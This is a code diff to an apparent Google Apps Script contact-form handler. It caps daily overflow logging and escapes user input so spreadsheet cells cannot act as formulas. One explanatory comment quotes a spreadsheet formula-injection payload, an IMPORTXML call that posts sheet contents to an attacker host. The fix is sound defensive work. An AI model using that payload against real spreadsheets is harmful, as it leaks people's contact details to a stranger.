@@ -20,6 +20,7 @@ var TZ = 'America/Chicago';
 var MAX_PER_HOUR = 6;
 var MAX_PER_DAY = 25;
 var RESERVE_QUOTA = 40;
+var MAX_OVERFLOW_PER_DAY = 100;
 
 function doGet(e) {
   try {
@@ -39,7 +40,11 @@ function doGet(e) {
 
     var verdict = checkLimits(email);
     if (verdict !== 'send') {
-      logOverflow(verdict, name, email, phone, message);
+      // Only log what a real over-limit inquiry looks like. The caps bound
+      // how many EMAILS go out, so without a bound here too, deliberately
+      // tripping one was an unmetered way to append rows to the coach's
+      // sheet all day.
+      if (allowOverflowLog()) logOverflow(verdict, name, email, phone, message);
       return respond({ success: true });
     }
 
@@ -91,12 +96,33 @@ function checkLimits(email) {
   }
 }
 
+// A cell starting with = + - or @ is a live formula to Sheets, not text, and
+// everything here is typed by an anonymous stranger. Left raw, a submission
+// of =IMPORTXML("https://attacker.example/?d="&CONCAT(A1:F99),"//x") runs the
+// moment the coach opens the sheet and posts every other row — names, emails,
+// phone numbers of real prospects — to whoever sent it. A leading apostrophe
+// makes Sheets store the value as text; it isn't shown in the cell.
+function sheetSafe(value) {
+  var str = String(value == null ? '' : value);
+  return /^[=+\-@\t\r]/.test(str) ? "'" + str : str;
+}
+
+// At most MAX_OVERFLOW_PER_DAY rows a day, whatever the traffic looks like.
+function allowOverflowLog() {
+  var cache = CacheService.getScriptCache();
+  var key = 'overflow:' + Utilities.formatDate(new Date(), TZ, 'yyyyMMdd');
+  var n = Number(cache.get(key) || 0);
+  if (n >= MAX_OVERFLOW_PER_DAY) return false;
+  cache.put(key, String(n + 1), 24 * 3600);
+  return true;
+}
+
 function logOverflow(reason, name, email, phone, message) {
   var id = PropertiesService.getScriptProperties().getProperty('OVERFLOW_SHEET_ID');
   if (!id) return;
   try {
     SpreadsheetApp.openById(id).getSheets()[0]
-      .appendRow([new Date(), reason, name, email, phone, message]);
+      .appendRow([new Date(), reason, sheetSafe(name), sheetSafe(email), sheetSafe(phone), sheetSafe(message)]);
   } catch (err) {
     // Logging is best-effort; never let it turn into an error for the visitor.
   }
